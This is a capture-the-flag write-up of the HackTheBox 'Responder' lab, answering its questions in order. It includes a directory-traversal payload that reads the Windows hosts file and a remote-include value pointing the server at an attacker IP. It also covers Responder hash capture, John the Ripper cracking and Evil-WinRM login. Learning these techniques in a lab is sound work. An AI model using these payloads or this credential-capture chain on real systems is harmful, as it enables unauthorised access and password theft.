RESPONDER HTB
In this lab we are going to use Curl 
Curl is a command -line tool that is used to send requests to servers and retrieve data from URLs. It lets you communicate with web servers directly from the terminal.


Identifying the Redirected Domain


1.When visiting the web service using the IP address, what is the domain that we are  being redirected to?
The url was http://10.129.95.234 
Using curl to send requests to the server we will get the domain that we are being redirected to.The command that we use is :curl http://10.129.95.234
In the image below it shows the results we got from the command


  

Figure 1:shows the domain  that we are being redirected to


 The tag instructs the browser to immediately redirect to another domain.The domain that we are being redirected to is unika.htb.




2.Which scripting language is being used on the server to generate webpages?


During the enumeration phase, the target web server was queried to identify technologies used by the application. The curl tool was used to retrieve the HTTP response headers from the server.


  

Figure 2: HTTP response headers revealing the PHP scripting language used by the server.


From the X-Powered-By header and the server banner, it was observed that the web application is powered by PHP version 8.1.1. This indicates that PHP is the scripting language used on the server to generate webpages




3. What is the name of the URL parameter which is used to load different language versions of the webpage?


  



Page  because the url was - http://unika.htb/index.php?page=french.html






4.Which of the following values for the page parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"


Local File Inclusion (LFI) happens when a web application loads a file from the server based on user input without proper validation.
During testing, the page parameter appeared to dynamically load different language versions of the webpage. Parameters that load files are commonly vulnerable to Local File Inclusion (LFI) if user input is not properly validated.
To test for LFI, I attempted to perform directory traversal using the ../ sequence to access files outside the web application's directory.
The following payload was used:
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
This payload attempts to traverse multiple directories upward and access the Windows hosts file, which is located at:
C:\Windows\System32\drivers\etc\hosts
The result for this is as shown below:
  

Figure 3: Successful Local File Inclusion retrieving the Windows hosts file.
This vulnerability occurs because the application directly uses user input from the page parameter to include files without proper validation or sanitization. An attacker could exploit this vulnerability to read sensitive files on the server and potentially escalate the attack to remote code execution.


5.Which of the following values for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
The payload that was used is-?page=//10.10.14.6/somefile 
The page parameter was tested for Remote File Inclusion by supplying the value //10.10.14.6/somefile. The application attempted to include the remote file using the PHP include() function, resulting in an error message. This confirms that the application processes user input as a file path, indicating a potential RFI vulnerability.
  

6.What does NTLM stand for?
New Technology Lan Manager


7. Which flag do we use in the Responder utility to specify the network interface?
Responder is a tool that listens for broadcast name resolution requests on a network and then spoofs responses so victims authenticate to you.It used to perform LLMNR and NBT‑NS poisoning attacks. It listens for broadcast name resolution requests on the network and responds to them, causing victim machines to authenticate to the attacker's machine. These authentication attempts contain NetNTLMv2 hashes which can be captured and cracked offline.
-I tells Responder which network interface to listen on.


  





8.There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as john, but the full name is what?.
John the ripper-is a password cracking tool used to discover plaintext passwords from hashed passwords.it supports many hash types including the NetNTLMv2  which is a challenge‑response authentication mechanism used by Windows for network authentication.
9. What is the password for the administrator user?
  

As shown in the diagram above we used john the ripper and the command used was 
john --show --format=netntlmv2 hash.txt 
The hash was obtained by using responder tool and then it was put inside the hash.txt file  as shown below in fig
  

The NTLMv2 hash 
  

Using the nano hash.txt we were able to open a terminal text editor and the pasted the hash in the hash.txt file


10 .We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?
 Port 5985 -this port belongs to the winRm service 
We used Evil -WinRM for the remote access
  




SUMMARY
1. Enumerated the web application using curl.
2. Identified a URL parameter vulnerable to Local File Inclusion.
3. Exploited LFI to access system files.
4. Triggered an authentication request to the attacker machine.
5. Captured the NetNTLMv2 hash using Responder.
6. Cracked the hash using John the Ripper.
7. Used the recovered credentials to access the system via WinRM (port 5985).